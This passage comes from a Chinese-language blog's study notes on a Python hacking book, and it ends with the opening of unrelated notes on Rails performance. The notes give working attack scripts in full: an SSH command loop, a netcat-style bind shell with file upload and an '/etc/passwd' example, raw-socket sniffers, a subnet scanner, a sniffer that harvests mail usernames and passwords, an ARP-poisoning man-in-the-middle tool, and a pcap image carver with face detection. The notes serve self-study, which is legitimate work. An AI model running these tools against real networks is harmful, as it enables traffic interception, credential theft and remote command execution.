print(&quot;[-] SSH negotiation failed.&quot;)    chan = bhSession.accept(20)    print(&quot;[+] Authenticated!&quot;)    print(chan.recv(1024)) # 這段其實不用    chan.send(&quot;Welcome to bh_ssh!&quot;)    while True:        try:            command = input(&quot;Enter command: &quot;).strip(&quot;\\n&quot;)            if command != &quot;exit&quot;:                chan.send(command)                print(chan.recv(1024).decode(errors=&quot;ignore&quot;) + &quot;\\n&quot;)            else:                chan.send(&quot;exit&quot;)                print(&quot;Exiting...&quot;)                bhSession.close()                raise Exception(&quot;exit&quot;)        except KeyboardInterrupt:            bhSession.close()        except Exception as e:            print(&quot;[-] Caught exception: &quot; + str(e))            bhSession.close()finally:    sys.exit(1)\n大概的流程是\n\nclient連到server\nserver丟指令到client\nclient跑指令回傳結果\n\n這邊就是自幹reverse tunnel\n\n下面就是包好的版本\n要注意到因為目的是relay sshd的東西到server\n所以剛剛例子是跑指令的部分變成proxy的code\nrforward.py\n#!/usr/bin/env python# Copyright (C) 2008  Robey Pointer &lt;robeypointer@gmail.com&gt;## This file is part of paramiko.## Paramiko is free software; you can redistribute it and/or modify it under the# terms of the GNU Lesser General Public License as published by the Free# Software Foundation; either version 2.1 of the License, or (at your option)# any later version.## Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more# details.## You should have received a copy of the GNU Lesser General Public License# along with Paramiko; if not, write to the Free Software Foundation, Inc.,# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.&quot;&quot;&quot;Sample script showing how to do remote port forwarding over paramiko.This script connects to the requested SSH server and sets up remote portforwarding (the openssh -R option) from a remote port through a tunneledconnection to a destination reachable from the local machine.&quot;&quot;&quot;import getpassimport socketimport selectimport sysimport threadingfrom optparse import OptionParserimport paramikoSSH_PORT = 22DEFAULT_PORT = 4000g_verbose = Truedef handler(chan, host, port):    sock = socket.socket()    try:        sock.connect((host, port)) # 與剛剛的例子對比，原本是在這裡跑指令，不過這邊是連到另一台server    except Exception as e:        verbose(&quot;Forwarding request to %s:%d failed: %r&quot; % (host, port, e))        return    verbose(        &quot;Connected!  Tunnel open %r -&gt; %r -&gt; %r&quot;        % (chan.origin_addr, chan.getpeername(), (host, port))    )    while True:\t# chan(sshd) &lt;-&gt; sock(real server)        r, w, x = select.select([sock, chan], [], [])        if sock in r:            data = sock.recv(1024)            if len(data) == 0:                break            chan.send(data)        if chan in r:            data = chan.recv(1024)            if len(data) == 0:                break            sock.send(data)    chan.close()    sock.close()    verbose(&quot;Tunnel closed from %r&quot; % (chan.origin_addr,))def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):    transport.request_port_forward(&quot;&quot;, server_port) # bind(&quot;0.0.0.0&quot;, server_port)    while True:        chan = transport.accept(1000) # accept 來自sshd的連線        if chan is None:            continue        thr = threading.Thread(            target=handler, args=(chan, remote_host, remote_port)        )        thr.setDaemon(True)        thr.start()def verbose(s):    if g_verbose:        print(s)HELP = &quot;&quot;&quot;\\Set up a reverse forwarding tunnel across an SSH server, using paramiko. Aport on the SSH server (given with -p) is forwarded across an SSH sessionback to the local machine, and out to a remote site reachable from thisnetwork. This is similar to the openssh -R option.&quot;&quot;&quot;def get_host_port(spec, default_port):    &quot;&quot;&quot;parse &#x27;hostname:22&#x27; into a host and port, with the port optional&quot;&quot;&quot;    args = (spec.split(&quot;:&quot;, 1) + [default_port])[:2]    args[1] = int(args[1])    return args[0], args[1]def parse_options():    global g_verbose    parser = OptionParser(        usage=&quot;usage: %prog [options] &lt;ssh-server&gt;[:&lt;server-port&gt;]&quot;,        version=&quot;%prog 1.0&quot;,        description=HELP,    )    parser.add_option(        &quot;-q&quot;,        &quot;--quiet&quot;,        action=&quot;store_false&quot;,        dest=&quot;verbose&quot;,        default=True,        help=&quot;squelch all informational output&quot;,    )    parser.add_option(        &quot;-p&quot;,        &quot;--remote-port&quot;,        action=&quot;store&quot;,        type=&quot;int&quot;,        dest=&quot;port&quot;,        default=DEFAULT_PORT,        help=&quot;port on server to forward (default: %d)&quot; % DEFAULT_PORT,    )    parser.add_option(        &quot;-u&quot;,        &quot;--user&quot;,        action=&quot;store&quot;,        type=&quot;string&quot;,        dest=&quot;user&quot;,        default=getpass.getuser(),        help=&quot;username for SSH authentication (default: %s)&quot;        % getpass.getuser(),    )    parser.add_option(        &quot;-K&quot;,        &quot;--key&quot;,        action=&quot;store&quot;,        type=&quot;string&quot;,        dest=&quot;keyfile&quot;,        default=None,        help=&quot;private key file to use for SSH authentication&quot;,    )    parser.add_option(        &quot;&quot;,        &quot;--no-key&quot;,        action=&quot;store_false&quot;,        dest=&quot;look_for_keys&quot;,        default=True,        help=&quot;don&#x27;t look for or use a private key file&quot;,    )    parser.add_option(        &quot;-P&quot;,        &quot;--password&quot;,        action=&quot;store_true&quot;,        dest=&quot;readpass&quot;,        default=False,        help=&quot;read password (for key or password auth) from stdin&quot;,    )    parser.add_option(        &quot;-r&quot;,        &quot;--remote&quot;,        action=&quot;store&quot;,        type=&quot;string&quot;,        dest=&quot;remote&quot;,        default=None,        metavar=&quot;host:port&quot;,        help=&quot;remote host and port to forward to&quot;,    )    options, args = parser.parse_args()    if len(args) != 1:        parser.error(&quot;Incorrect number of arguments.&quot;)    if options.remote is None:        parser.error(&quot;Remote address required (-r).&quot;)    g_verbose = options.verbose    server_host, server_port = get_host_port(args[0], SSH_PORT)    remote_host, remote_port = get_host_port(options.remote, SSH_PORT)    return options, (server_host, server_port), (remote_host, remote_port)def main():    options, server, remote = parse_options()    password = None    if options.readpass:        password = getpass.getpass(&quot;Enter SSH password: &quot;)    client = paramiko.SSHClient()    client.load_system_host_keys()    client.set_missing_host_key_policy(paramiko.WarningPolicy())    verbose(&quot;Connecting to ssh host %s:%d ...&quot; % (server[0], server[1]))    try:        client.connect(            server[0],            server[1],            username=options.user,            key_filename=options.keyfile,            look_for_keys=options.look_for_keys,            password=password,        )    except Exception as e:        print(&quot;*** Failed to connect to %s:%d: %r&quot; % (server[0], server[1], e))        sys.exit(1)    verbose(        &quot;Now forwarding remote port %d to %s:%d ...&quot;        % (options.port, remote[0], remote[1])    )    try:        reverse_forward_tunnel(            options.port, remote[0], remote[1], client.get_transport()        )    except KeyboardInterrupt:        print(&quot;C-c: Port forwarding stopped.&quot;)        sys.exit(0)if __name__ == &quot;__main__&quot;:    main()\n總複習: Netcat Replacement\nbhnet.py\nimport sysimport socketimport getoptimport threadingimport subprocess# define some global variableslisten = Falsecommand = Falseupload = Falseexecute = &quot;&quot;target = &quot;&quot;upload_destination = &quot;&quot;port = 0# this runs a command and returns the outputdef run_command(cmd):    # trim the newline    cmd = cmd.rstrip()    # run the command and get the output back    try:        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT,                                         shell=True)    except subprocess.CalledProcessError as e:        output = e.output    # send the output back to the client    return output# this handles incoming client connectionsdef client_handler(client_socket):    global upload    global execute    global command    # check for upload    if len(upload_destination):        # read in all of the bytes and write to our destination        file_buffer = &quot;&quot;        # keep reading data until none is available        while True:            data = client_socket.recv(1024)            if not data:                break            else:                file_buffer += data        # now we take these bytes and try to write them out        try:            file_descriptor = open(upload_destination, &quot;wb&quot;)            file_descriptor.write(file_buffer.encode(&#x27;utf-8&#x27;))            file_descriptor.close()            # acknowledge that we wrote the file out            client_socket.send(                &quot;Successfully saved file to %s\\r\\n&quot; % upload_destination)        except OSError:            client_socket.send(                &quot;Failed to save file to %s\\r\\n&quot; % upload_destination)    # check for command execution    if len(execute):        # run the command        output = run_command(execute)        client_socket.send(output)    # now we go into another loop if a command shell was requested    if command:        while True:            # show a simple prompt            client_socket.send(&quot;&lt;BHP:#&gt; &quot;.encode(&#x27;utf-8&#x27;))            # now we receive until we see a linefeed (enter key)            cmd_buffer = b&#x27;&#x27;            while b&quot;\\n&quot; not in cmd_buffer:                cmd_buffer += client_socket.recv(1024)            # we have a valid command so execute it and send back the results            response = run_command(cmd_buffer)            # send back the response            client_socket.send(response)# this is for incoming connectionsdef server_loop():    global target    global port    # if no target is defined we listen on all interfaces    if not len(target):        target = &quot;0.0.0.0&quot;    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    server.bind((target, port))    server.listen(5)    while True:        client_socket, addr = server.accept()        # spin off a thread to handle our new client        client_thread = threading.Thread(target=client_handler,                                         args=(client_socket,))        client_thread.start()# if we don&#x27;t listen we are a client... make it so.def client_sender(buffer):    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    try:        # connect to our target host        client.connect((target, port))        # if we detect input from stdin send it        # if not we are going to wait for the user to punch some in        if len(buffer):            client.send(buffer.encode(&#x27;utf-8&#x27;))        while True:            # now wait for data back            recv_len = 1            response = b&#x27;&#x27;            while recv_len:                data = client.recv(4096)                recv_len = len(data)                response += data                if recv_len &lt; 4096:                    break            print(response.decode(&#x27;utf-8&#x27;), end=&#x27; &#x27;)            # wait for more input            buffer = input(&quot;&quot;)            buffer += &quot;\\n&quot;            # send it off            client.send(buffer.encode(&#x27;utf-8&#x27;))    except socket.error as exc:        # just catch generic errors - you can do your homework to beef this up        print(&quot;[*] Exception! Exiting.&quot;)        print(f&quot;[*] Caught exception socket.error: &#123;exc&#125;&quot;)        # teardown the connection        client.close()def usage():    print(&quot;Netcat Replacement&quot;)    print()    print(&quot;Usage: bhpnet.py -t target_host -p port&quot;)    print(        &quot;-l --listen                - listen on [host]:[port] for incoming &quot;        &quot;connections&quot;)    print(        &quot;-e --execute=file_to_run   - execute the given file upon receiving &quot;        &quot;a connection&quot;)    print(&quot;-c --command               - initialize a command shell&quot;)    print(        &quot;-u --upload=destination    - upon receiving connection upload a file &quot;        &quot;and write to [destination]&quot;)    print()    print()    print(&quot;Examples: &quot;)    print(&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -c&quot;)    print(&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe&quot;)    print(&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\&quot;cat /etc/passwd\\&quot;&quot;)    print(&quot;echo &#x27;ABCDEFGHI&#x27; | ./bhpnet.py -t 192.168.11.12 -p 135&quot;)    sys.exit(0)def main():    global listen    global port    global execute    global command    global upload_destination    global target    if not len(sys.argv[1:]):        usage()    # read the commandline options    try:        opts, args = getopt.getopt(sys.argv[1:], &quot;hle:t:p:cu:&quot;,                                   [&quot;help&quot;, &quot;listen&quot;, &quot;execute&quot;, &quot;target&quot;,                                    &quot;port&quot;, &quot;command&quot;, &quot;upload&quot;])        for o, a in opts:            if o in (&quot;-h&quot;, &quot;--help&quot;):                usage()            elif o in (&quot;-l&quot;, &quot;--listen&quot;):                listen = True            elif o in (&quot;-e&quot;, &quot;--execute&quot;):                execute = a            elif o in (&quot;-c&quot;, &quot;--commandshell&quot;):                command = True            elif o in (&quot;-u&quot;, &quot;--upload&quot;):                upload_destination = a            elif o in (&quot;-t&quot;, &quot;--target&quot;):                target = a            elif o in (&quot;-p&quot;, &quot;--port&quot;):                port = int(a)            else:                assert False, &quot;Unhandled Option&quot;    except getopt.GetoptError as err:        print(str(err))        usage()    # are we going to listen or just send data from STDIN?    if not listen and len(target) and port &gt; 0:        # read in the buffer from the commandline        # this will block, so send CTRL-D if not sending input        # to stdin        buffer = sys.stdin.read()        # send data off        client_sender(buffer)    # we are going to listen and potentially    # upload things, execute commands and drop a shell back    # depending on our command line options above    if listen:        server_loop()main()\n就是proxy + run_command + server + client的集大成(不包含SSH)\n作為netcat(nc)的替代品\nCH3\n這章就是介紹raw socket，沒有第四層的socket\nsniffer_basic.py\nimport socketimport os# host to listen onhost = &quot;192.168.0.196&quot;# create a raw socket and bind it to the public interfaceif os.name == &quot;nt&quot;:    socket_protocol = socket.IPPROTO_IPelse:    socket_protocol = socket.IPPROTO_ICMPsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # 沒有第四層，就不用port# we want the IP headers included in the capturesniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# if we&#x27;re on Windows we need to send an IOCTL# to setup promiscuous modeif os.name == &quot;nt&quot;:     sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)# read in a single packetprint(sniffer.recvfrom(65535))# if we&#x27;re on Windows turn off promiscuous modeif os.name == &quot;nt&quot;:    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)\n設定一個socket接收所有packet，但收到的資料都是byte，要依據protocol的規定轉成對應的datatype\n\nsniffer_ip_header_decode.py\nimport socketimport osimport structfrom ctypes import *# host to listen onhost = &quot;192.168.0.187&quot;class IP(Structure):    _fields_ = [        (&quot;ihl&quot;, c_ubyte, 4),        (&quot;version&quot;, c_ubyte, 4),        (&quot;tos&quot;, c_ubyte),        (&quot;len&quot;, c_ushort),        (&quot;id&quot;, c_ushort),        (&quot;offset&quot;, c_ushort),        (&quot;ttl&quot;, c_ubyte),        (&quot;protocol_num&quot;, c_ubyte),        (&quot;sum&quot;, c_ushort),        (&quot;src&quot;, c_uint32),        (&quot;dst&quot;, c_uint32)    ]    def __new__(cls, socket_buffer=None):        return cls.from_buffer_copy(socket_buffer)    def __init__(self, socket_buffer=None):        self.socket_buffer = socket_buffer        # map protocol constants to their names        self.protocol_map = &#123;1: &quot;ICMP&quot;, 6: &quot;TCP&quot;, 17: &quot;UDP&quot;&#125;        # human readable IP addresses        self.src_address = socket.inet_ntoa(struct.pack(&quot;@I&quot;, self.src))        self.dst_address = socket.inet_ntoa(struct.pack(&quot;@I&quot;, self.dst))        # human readable protocol        try:            self.protocol = self.protocol_map[self.protocol_num]        except IndexError:            self.protocol = str(self.protocol_num)# create a raw socket and bind it to the public interfaceif os.name == &quot;nt&quot;:    socket_protocol = socket.IPPROTO_IPelse:    socket_protocol = socket.IPPROTO_ICMPsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)sniffer.bind((host, 0))# we want the IP headers included in the capturesniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# if we&#x27;re on Windows we need to send some ioctl# to setup promiscuous modeif os.name == &quot;nt&quot;:    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)try:    while True:        # read in a single packet        raw_buffer = sniffer.recvfrom(65535)[0]        # create an IP header from the first 20 bytes of the buffer        ip_header = IP(raw_buffer[:20])        print(&quot;Protocol: %s %s -&gt; %s&quot; % (            ip_header.protocol,            ip_header.src_address,            ip_header.dst_address)              )except KeyboardInterrupt:    # if we&#x27;re on Windows turn off promiscuous mode    if os.name == &quot;nt&quot;:        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)\n這很像把水用成造型冰塊一樣，把byte依據field的規定來找出我們需要的資訊\n\n\nsniffer_with_icmp.py\nimport socketimport osimport structfrom ctypes import *# host to listen onhost = &quot;192.168.0.187&quot;class IP(Structure):        _fields_ = [        (&quot;ihl&quot;,           c_ubyte, 4), # c_ubyte的前4個bits        (&quot;version&quot;,       c_ubyte, 4), # c_ubyte的後4個bits        (&quot;tos&quot;,           c_ubyte),        (&quot;len&quot;,           c_ushort),        (&quot;id&quot;,            c_ushort),        (&quot;offset&quot;,        c_ushort),        (&quot;ttl&quot;,           c_ubyte),        (&quot;protocol_num&quot;,  c_ubyte),        (&quot;sum&quot;,           c_ushort),        (&quot;src&quot;,           c_uint32),        (&quot;dst&quot;,           c_uint32)    ]    def __new__(cls, socket_buffer=None):        return cls.from_buffer_copy(socket_buffer)    def __init__(self, socket_buffer=None):        self.socket_buffer = socket_buffer        # map protocol constants to their names        self.protocol_map = &#123;1: &quot;ICMP&quot;, 6: &quot;TCP&quot;, 17: &quot;UDP&quot;&#125;                # human readable IP addresses        self.src_address = socket.inet_ntoa(struct.pack(&quot;@I&quot;, self.src))        self.dst_address = socket.inet_ntoa(struct.pack(&quot;@I&quot;, self.dst))            # human readable protocol        try:            self.protocol = self.protocol_map[self.protocol_num]        except IndexError:            self.protocol = str(self.protocol_num)class ICMP(Structure):        _fields_ = [        (&quot;type&quot;,         c_ubyte),        (&quot;code&quot;,         c_ubyte),        (&quot;checksum&quot;,     c_ushort),        (&quot;unused&quot;,       c_ushort),        (&quot;next_hop_mtu&quot;, c_ushort)        ]        def __new__(cls, socket_buffer):        return cls.from_buffer_copy(socket_buffer)    def __init__(self, socket_buffer):        self.socket_buffer = socket_buffer# create a raw socket and bind it to the public interfaceif os.name == &quot;nt&quot;:    socket_protocol = socket.IPPROTO_IP else:    socket_protocol = socket.IPPROTO_ICMP    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)sniffer.bind((host, 0))# we want the IP headers included in the capturesniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# if we&#x27;re on Windows we need to send some ioctl# to setup promiscuous modeif os.name == &quot;nt&quot;:    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)try:    while True:        # read in a single packet        raw_buffer = sniffer.recvfrom(65535)[0]                # create an IP header from the first 20 bytes of the buffer        ip_header = IP(raw_buffer[:20])              print(&quot;Protocol: %s %s -&gt; %s&quot; % (            ip_header.protocol,            ip_header.src_address,            ip_header.dst_address)              )        # if it&#x27;s ICMP we want it        if ip_header.protocol == &quot;ICMP&quot;:            # calculate where our ICMP packet starts            offset = ip_header.ihl * 4            buf = raw_buffer[offset:offset + sizeof(ICMP)]                        # create our ICMP structure            icmp_header = ICMP(buf)                        print(&quot;ICMP -&gt; Type: %d Code: %d&quot; % (                icmp_header.type,                icmp_header.code)                  )# handle CTRL-Cexcept KeyboardInterrupt:    # if we&#x27;re on Windows turn off promiscuous mode    if os.name == &quot;nt&quot;:        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)\nICMP是(IP (ICMP ...))的包裝\n但都byte要怎麼區分哪裡是IP還是ICMP的byte?\n因此IP要知道自己有多長(ip_header.ihl * 4，乘4是因為ihl的單位是4bytes)，這樣就可以知道ICMP從哪邊開始\n\nscanner.py\nimport socketimport osimport structimport threadingfrom ipaddress import ip_address, ip_networkfrom ctypes import *# host to listen onhost = &quot;192.168.0.187&quot;# subnet to targettgt_subnet = &quot;192.168.0.0/24&quot;# magic we&#x27;ll check ICMP responses fortgt_message = &quot;PYTHONRULES!&quot;def udp_sender(sub_net, magic_message):    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    for ip in ip_network(sub_net).hosts():        sender.sendto(magic_message.encode(&#x27;utf-8&#x27;), (str(ip), 65212))class IP(Structure):    _fields_ = [        (&quot;ihl&quot;, c_ubyte, 4),        (&quot;version&quot;, c_ubyte, 4),        (&quot;tos&quot;, c_ubyte),        (&quot;len&quot;, c_ushort),        (&quot;id&quot;, c_ushort),        (&quot;offset&quot;, c_ushort),        (&quot;ttl&quot;, c_ubyte),        (&quot;protocol_num&quot;, c_ubyte),        (&quot;sum&quot;, c_ushort),        (&quot;src&quot;, c_uint32),        (&quot;dst&quot;, c_uint32)    ]    def __new__(cls, socket_buffer=None):        return cls.from_buffer_copy(socket_buffer)    def __init__(self, socket_buffer=None):        self.socket_buffer = socket_buffer        # map protocol constants to their names        self.protocol_map = &#123;1: &quot;ICMP&quot;, 6: &quot;TCP&quot;, 17: &quot;UDP&quot;&#125;        # human readable IP addresses        self.src_address = socket.inet_ntoa(struct.pack(&quot;@I&quot;, self.src))        self.dst_address = socket.inet_ntoa(struct.pack(&quot;@I&quot;, self.dst))        # human readable protocol        try:            self.protocol = self.protocol_map[self.protocol_num]        except IndexError:            self.protocol = str(self.protocol_num)class ICMP(Structure):    _fields_ = [        (&quot;type&quot;, c_ubyte),        (&quot;code&quot;, c_ubyte),        (&quot;checksum&quot;, c_ushort),        (&quot;unused&quot;, c_ushort),        (&quot;next_hop_mtu&quot;, c_ushort)    ]    def __new__(cls, socket_buffer):        return cls.from_buffer_copy(socket_buffer)    def __init__(self, socket_buffer):        self.socket_buffer = socket_buffer# create a raw socket and bind it to the public interfaceif os.name == &quot;nt&quot;:    socket_protocol = socket.IPPROTO_IPelse:    socket_protocol = socket.IPPROTO_ICMPsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)sniffer.bind((host, 0))# we want the IP headers included in the capturesniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# if we&#x27;re on Windows we need to send some ioctl# to setup promiscuous modeif os.name == &quot;nt&quot;:    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)# start sending packetst = threading.Thread(target=udp_sender, args=(tgt_subnet, tgt_message))t.start()try:    while True:        # read in a single packet        raw_buffer = sniffer.recvfrom(65535)[0]        # create an IP header from the first 20 bytes of the buffer        ip_header = IP(raw_buffer[:20])        print(&quot;Protocol: %s %s -&gt; %s&quot; % (            ip_header.protocol,            ip_header.src_address,            ip_header.dst_address)              )        # if it&#x27;s ICMP we want it        if ip_header.protocol == &quot;ICMP&quot;:            # calculate where our ICMP packet starts            offset = ip_header.ihl * 4            buf = raw_buffer[offset:offset + sizeof(ICMP)]            # create our ICMP structure            icmp_header = ICMP(buf)            print(&quot;ICMP -&gt; Type: %d Code: %d&quot; % (                icmp_header.type,                icmp_header.code)                  )            # now check for the TYPE 3 and CODE 3 which indicates            # a host is up but no port available to talk to                       if icmp_header.code == 3 and icmp_header.type == 3:                # check to make sure we are receiving the response                 # that lands in our subnet                if ip_address(ip_header.src_address) in ip_network(tgt_subnet):                    # test for our magic message                    if raw_buffer[len(raw_buffer)                       - len(tgt_message):] == tgt_message:                        print(&quot;Host Up: %s&quot; % ip_header.src_address)# handle CTRL-Cexcept KeyboardInterrupt:    # if we&#x27;re on Windows turn off promiscuous mode    if os.name == &quot;nt&quot;:        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)\n目的是找出子網路中的活動ip\n流程是一個thraed對某個子網路的所有ip送udp，如果host還活著，就會退回封包並加上icmp格式的錯誤訊息\nCH4\nmail_sniffer.py\nfrom kamene.all import *# our packet callbackdef packet_callback(packet):    if packet[TCP].payload:        mail_packet = bytes(packet[TCP].payload)        if b&#x27;user&#x27; in mail_packet.lower() or b&#x27;pass&#x27; in mail_packet.lower():            print(&quot;[*] Server: %s&quot; % packet[IP].dst)            print(&quot;[*] %s&quot; % packet[TCP].payload)# fire up our sniffersniff(filter=&quot;tcp port 110 or tcp port 25 or tcp port 143&quot;,      prn=packet_callback,      store=0)\n這應該很直觀，目的是看tcp payload有沒有user與pass\n之後應該補個tcpdump的條件式語法。\n\narper.py\nfrom kamene.all import *import sysimport threadinginterface = &quot;en1&quot;tgt_ip = &quot;172.16.1.71&quot;tgt_gateway = &quot;172.16.1.254&quot;packet_count = 1000poisoning = Truedef restore_target(gateway_ip, gateway_mac, target_ip, target_mac):    # slightly different method using send    print(&quot;[*] Restoring target...&quot;)    send(ARP(op=2,             psrc=gateway_ip,             pdst=target_ip,             hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;,             hwsrc=gateway_mac),         count=5)    send(ARP(op=2,             psrc=target_ip,             pdst=gateway_ip,             hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;,             hwsrc=target_mac),         count=5)def get_mac(ip_address):    responses, unanswered = srp(        Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(pdst=ip_address),        timeout=2,        retry=10    )    # return the MAC address from a response    for s, r in responses:        return r[Ether].src    return Nonedef poison_target(gateway_ip, gateway_mac, target_ip, target_mac):    global poisoning    poison_tgt = ARP()    poison_tgt.op = 2    poison_tgt.psrc = gateway_ip    poison_tgt.pdst = target_ip    poison_tgt.hwdst = target_mac    poison_gateway = ARP()    poison_gateway.op = 2    poison_gateway.psrc = target_ip    poison_gateway.pdst = gateway_ip    poison_gateway.hwdst = gateway_mac    print(&quot;[*] Beginning the ARP poison. [CTRL-C to stop]&quot;)    while poisoning:        send(poison_tgt)        send(poison_gateway)        time.sleep(2)    print(&quot;[*] ARP poison attack finished.&quot;)    return# set our interfaceconf.iface = interface# turn off outputconf.verb = 0print(&quot;[*] Setting up %s&quot; % interface)tgt_gateway_mac = get_mac(tgt_gateway)if tgt_gateway_mac is None:    print(&quot;[!!!] Failed to get gateway MAC. Exiting.&quot;)    sys.exit(0)else:    print(&quot;[*] Gateway %s is at %s&quot; % (tgt_gateway, tgt_gateway_mac))tgt_mac = get_mac(tgt_ip)if tgt_mac is None:    print(&quot;[!!!] Failed to get target MAC. Exiting.&quot;)    sys.exit(0)else:    print(&quot;[*] Target %s is at %s&quot; % (tgt_ip, tgt_mac))# start poison threadpoison_thread = threading.Thread(target=poison_target,                                 args=(tgt_gateway,                                       tgt_gateway_mac,                                       tgt_ip,                                       tgt_mac)                                 )poison_thread.start()try:    print(&quot;[*] Starting sniffer for %d packets&quot; % packet_count)    bpf_filter = &quot;ip host %s&quot; % tgt_ip    packets = sniff(count=packet_count,                    filter=bpf_filter,                    iface=interface                    )    # write out the captured packets    print(&quot;[*] Writing packets to arper.pcap&quot;)    wrpcap(&#x27;arper.pcap&#x27;, packets)except KeyboardInterrupt:    passfinally:    poisoning = False    # wait for poisoning thread to exit    time.sleep(2)    # restore the network    restore_target(tgt_gateway,                   tgt_gateway_mac,                   tgt_ip,                   tgt_mac                   )    sys.exit(0)\n這裡是做arp汙染，把gateway的eth addr用成自己的\n這樣就能上面的sniffer來看封包\n手法是一直發假的arp這樣只要有機器吃到，就會把封包丟到這裡\n但現在這個手法都行不通拉 都會被擋\n\n還有一個是讀pcap來找出圖片，同時對圖片作人臉辨識\npic_carver.py\nimport cv2from kamene.all import *pictures_directory = &quot;pic_carver/pictures&quot;faces_directory = &quot;pic_carver/faces&quot;pcap_file = &quot;bhp.pcap&quot;def face_detect(path, file_name):    img = cv2.imread(path)    cascade = cv2.CascadeClassifier(&quot;haarcascade_frontalface_alt.xml&quot;)    rects = cascade.detectMultiScale(img, 1.3, 4,                                     cv2.CASCADE_SCALE_IMAGE, (20, 20)                                     )    if len(rects) == 0:        return False    rects[:, 2:] += rects[:, :2]    # highlight the faces in the image    for x1, y1, x2, y2 in rects:        cv2.rectangle(img, (x1, y1), (x2, y2), (127, 255, 0), 2)    cv2.imwrite(&quot;%s/%s-%s&quot; % (faces_directory, pcap_file, file_name), img)    return Truedef get_http_headers(http_payload):    try:        # split the headers off if it is HTTP traffic        headers_raw = http_payload[:http_payload.index(&quot;\\r\\n\\r\\n&quot;) + 2]        # break out the headers        headers = dict(            re.findall(r&quot;(?P&lt;name&gt;.*?): (?P&lt;value&gt;.*?)\\r\\n&quot;, headers_raw))    except:        return None    if &quot;Content-Type&quot; not in headers:        return None    return headersdef extract_image(headers, http_payload):    image = None    image_type = None    try:        if &quot;image&quot; in headers[&#x27;Content-Type&#x27;]:            # grab the image type and image body            image_type = headers[&#x27;Content-Type&#x27;].split(&quot;/&quot;)[1]            image = http_payload[http_payload.index(&quot;\\r\\n\\r\\n&quot;) + 4:]            # if we detect compression decompress the image            try:                if &quot;Content-Encoding&quot; in list(headers.keys()):                    if headers[&#x27;Content-Encoding&#x27;] == &quot;gzip&quot;:                        image = zlib.decompress(image, 16 + zlib.MAX_WBITS)                    elif headers[&#x27;Content-Encoding&#x27;] == &quot;deflate&quot;:                        image = zlib.decompress(image)            except:                pass    except:        return None, None    return image, image_typedef http_assembler(pcap_fl):    carved_images = 0    faces_detected = 0    a = rdpcap(pcap_fl)    sessions = a.sessions()    for session in sessions:        http_payload = &quot;&quot;        for packet in sessions[session]:            try:                if packet[TCP].dport == 80 or packet[TCP].sport == 80:                    # reassemble the stream into a single buffer                    http_payload += str(packet[TCP].payload)            except:                pass        headers = get_http_headers(http_payload)        if headers is None:            continue        image, image_type = extract_image(headers, http_payload)        if image is not None and image_type is not None:            # store the image            file_name = &quot;%s-pic_carver_%d.%s&quot; % (                pcap_fl, carved_images, image_type)            fd = open(&quot;%s/%s&quot; % (pictures_directory, file_name), &quot;wb&quot;)            fd.write(image)            fd.close()            carved_images += 1            # now attempt face detection            try:                result = face_detect(&quot;%s/%s&quot; % (pictures_directory, file_name),                                     file_name)                if result is True:                    faces_detected += 1            except:                pass    return carved_images, faces_detectedcarved_img, faces_dtct = http_assembler(pcap_file)print(&quot;Extracted: %d images&quot; % carved_images)print(&quot;Detected: %d faces&quot; % faces_detected)\n整個流程是\n\n把封包導向自己 (arper.py)\nsniff出需要的封包，存成pcap (mail_sniffer.py，雖然沒有存成pcap的部分)\n對pcap做分析(pic_carver.py)\n\n","categories":["Python","Reading"]},{"title":"the complete guide to rails performance讀後筆記","url":"/2022/01/the-complete-guide-to-rails-performance-notes/","content":"動機\n好看的書，但我主要是看怎麼profile與gc所以有跳過一些部分\n跳過:\nwebfont, CDN, SSL, HTTP cache, Rails Cache, Backgrounding Work\n\nprinciple\nBenford’s Law\n越大的數，以它為首幾位的數出現的機率就越低。它可用於檢查各種數據是否有造假\n\nZipf’s law\n一個單詞出現的頻率與它在頻率表里的排名成反比\n只有少數的單字常常被使用\n\nZipf’s law是離散的分布，如果用成連續的就是Pareto’s law(80/20)\nPareto’s law\n80%的財富掌握在20%的人手上\n\nPareto’s law告訴我們把時間花在找出那20%決定80%的部分\n所以下面的章節有很大一部分在怎麼測量，與測量什麼\nlittle law\n\n是幾台主機\n是單位時間有多少req\n是主機的avg. response time\n這是針對長期而言的式子，主要是用來看有沒有over-scaled(太多主機了、太少主機了(主機數剛好是算出來的數字!?))\n另外，little law預設，req彼此獨立、server彼此獨立(不能互卡(IO)、卡資源(cpu或mem有限))、response不能差平均太多(95th percentile response times很重要)\n同時也是說，scale對avg. response 